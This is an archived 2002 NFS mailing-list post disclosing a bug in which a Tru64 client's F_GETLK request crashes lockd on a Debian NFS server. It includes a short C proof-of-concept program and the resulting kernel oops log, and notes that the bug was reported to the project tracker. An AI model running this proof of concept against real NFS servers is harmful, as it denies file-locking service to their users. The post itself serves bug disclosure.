From: psz@maths.usyd.edu.au (Paul Szabo)
Subject: DoS lockd
Date: Wed, 18 Sep 2002 11:37:26 +1000 (EST)
Sender: nfs-admin@lists.sourceforge.net
Message-ID: <200209180137.g8I1bQf87489@milan.maths.usyd.edu.au>
Return-path: <nfs-admin@lists.sourceforge.net>
Received: from talus.maths.usyd.edu.au ([129.78.68.1])
	by usw-sf-list1.sourceforge.net with esmtp (Exim 3.31-VA-mm2 #1 (Debian))
	id 17rTnE-00017W-00
	for <nfs@lists.sourceforge.net>; Tue, 17 Sep 2002 18:38:17 -0700
Received: from milan.maths.usyd.edu.au (psz(.amstaff;1001.1001)@milan.maths.usyd.edu.au) [129.78.69.163]
	by siv.maths.usyd.edu.au via smtpdoor V15.3
	id 503350 for nfs@lists.sourceforge.net; Wed, 18 Sep 2002 11:37:27 +1000
To: nfs@lists.sourceforge.net
Errors-To: nfs-admin@lists.sourceforge.net
List-Help: <mailto:nfs-request@lists.sourceforge.net?subject=help>
List-Post: <mailto:nfs@lists.sourceforge.net>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/nfs>,
	<mailto:nfs-request@lists.sourceforge.net?subject=subscribe>
List-Id: Discussion of NFS under Linux development,
	interoperability,
	and testing. <nfs.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/nfs>,
	<mailto:nfs-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchives/forum.php?forum=nfs>

A Tru64 client may accidentally crash the lockd process on a Debian server.
I wonder if this "works" on other Linux versions, and if this attack may be
exploited to more than a DoS.

Any followups/replies please send me directly, as I am not subscribed to
the nfs@lists.sourceforge.net mailing list.

Cheers,

Paul Szabo - psz@maths.usyd.edu.au  http://www.maths.usyd.edu.au:8000/u/psz/
School of Mathematics and Statistics  University of Sydney   2006  Australia

---

/*
 * There are problems with NFS exporting from a Debian server and mounting on
 * a Tru64 client: a simple F_GETLK request may crash lockd on the server,
 * creating a Denial-of-Service attack. (We can attack a Debian server from
 * any client we can control; from Tru64 we do not even need "root".) I am not
 * sure if this can be leveraged into more than a DoS.
 * 
 * Tested on: Server: Debian woody:
 * root@padua:~# uname -a
 * Linux padua.maths.usyd.edu.au 2.4.18 #1 SMP Mon May 13 10:53:31 EST 2002 i686 unknown
 * Client: Tru64 V5.1:
 * # uname -a 
 * OSF1 turin.maths.usyd.edu.au V5.1 732 alpha
 * 
 * We need insecure_locks in /etc/exports for Tru64 clients, see 
 * http://mirror.cse.unsw.edu.au/pub/LDP/HOWTO/NFS-HOWTO/interop.html#TRU64
 * for details.
 * On the other hand, do not need lockd in /etc/hosts.allow, despite
 * http://mirror.cse.unsw.edu.au/pub/LDP/HOWTO/NFS-HOWTO/server.html#HOSTS

Source package in
http://mirror.cse.unsw.edu.au/pub/debian/pool/main/n/nfs-utils/nfs-utils_1.0.1-1.tar.gz

Submitted to http://sourceforge.net/projects/nfs/ on 17 Sep 02, see:
http://sourceforge.net/tracker/index.php?func=detail&aid=610233&group_id=14&atid=100014

 */

#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>

main(int argc, char* argv[]) {
  int fd;
  struct flock lock;
  int ret;

  printf ("Opening %s ...\n", argv[1]);
  fd = open (argv[1], O_RDONLY);
  printf ("open returned fd=%d\n", fd);
  if (fd<1) exit(0);
  
  lock.l_type = F_RDLCK;
  lock.l_whence = SEEK_SET;
  lock.l_start = 0;
  lock.l_len = 1000000;
  lock.l_pid = 0;
  errno = 0;
  ret = fcntl(fd,F_SETLK,&lock);
  printf ("fcntl F_SETLK returned %d, errno %d (%s)\n",ret,errno,strerror(errno));

/*
 * BEWARE: the following may crash padua's lockd (see below): crash for any
 * non-world-writable file in a directory exported rw without insecure_locks;
 * no crash when exporting ro or rw,insecure_locks or for a world-writable
 * file.
 */
  lock.l_type = F_RDLCK;
  lock.l_whence = SEEK_SET;
  lock.l_start = 0;
  lock.l_len = 1000000;
  lock.l_pid = 0;
  errno = 0;
  ret = fcntl(fd,F_GETLK,&lock);
  printf ("fcntl F_GETLK returned %d, errno %d (%s)\n",ret,errno,strerror(errno));
  printf ("fcntl shows PID %d\n", lock.l_pid);
}

/*
Crash caused by GETLK:
Sep 13 12:22:46 padua kernel: Unable to handle kernel paging request at virtual address ac0a6b44
Sep 13 12:22:46 padua kernel:  printing eip:
Sep 13 12:22:46 padua kernel: c02344e5
Sep 13 12:22:46 padua kernel: *pde = 00000000
Sep 13 12:22:46 padua kernel: Oops: 0002
Sep 13 12:22:46 padua kernel: CPU:    1
Sep 13 12:22:46 padua kernel: EIP:    0010:[xdr_encode_netobj+21/76]    Not tainted
Sep 13 12:22:46 padua kernel: EFLAGS: 00010207
Sep 13 12:22:46 padua kernel: eax: 3007beb7   ebx: ebeb7068   ecx: ebeb7068   edx: dc3c0e64
Sep 13 12:22:46 padua kernel: esi: dc3c0e6c   edi: c018c8d8   ebp: c6ba7100   esp: f7765d90
Sep 13 12:22:46 padua kernel: ds: 0018   es: 0018   ss: 0018
Sep 13 12:22:46 padua kernel: Process lockd (pid: 114, stackpage=f7765000)
Sep 13 12:22:46 padua kernel: Stack: ebeb7068 dc3c0e6c c018c8d8 c018c019 ebeb7068 dc3c0e64 cb9e205c eb639680 
Sep 13 12:22:46 padua kernel:        c018c8d8 c6ba7100 eb639680 ebeb7018 00000000 c6ba7100 c018c8ec ebeb7054 
Sep 13 12:22:46 padua kernel:        dc3c0e08 cb9e205c c022b2ec cb9e205c ebeb7054 dc3c0e08 eb6396d4 fffffff5 
Sep 13 12:22:46 padua kernel: Call Trace: [nlm4clt_encode_testres+0/48] [nlm4_encode_testres+137/496] [nlm4clt_encode_testres+0/48] [nlm4clt_encode_testres+20/48] [call_encode+216/260] 
Sep 13 12:22:46 padua kernel:    [__rpc_execute+196/888] [rpcauth_bindcred+60/84] [rpc_call_setup+62/112] [rpc_execute+88/112] [rpc_call_async+125/164] [nlmsvc_async_call+130/152] 
Sep 13 12:22:46 padua kernel:    [nlm4svc_callback_exit+0/84] [nlm4svc_callback+119/156] [nlm4svc_callback_exit+0/84] [nlm4svc_proc_test_msg+72/84] [sock_sendmsg+105/136] [skb_checksum+72/700] 
Sep 13 12:22:46 padua kernel:    [nlm4_decode_oh+15/20] [nlm4_decode_lock+76/304] [nlm4_decode_lock+106/304] [nlm4svc_decode_testargs+78/84] [svc_process+537/1236] [lockd+475/660] 
Sep 13 12:22:46 padua kernel:    [kernel_thread+40/56] 
Sep 13 12:22:46 padua kernel: 
Sep 13 12:22:46 padua kernel: Code: c7 04 83 00 00 00 00 8b 02 0f c8 89 01 8b 72 04 8b 02 83 c3 
*/


-------------------------------------------------------
This SF.NET email is sponsored by: AMD - Your access to the experts
on Hammer Technology! Open Source & Linux Developers, register now
for the AMD Developer Symposium. Code: EX8664
http://www.developwithamd.com/developerlab
_______________________________________________
NFS maillist  -  NFS@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/nfs
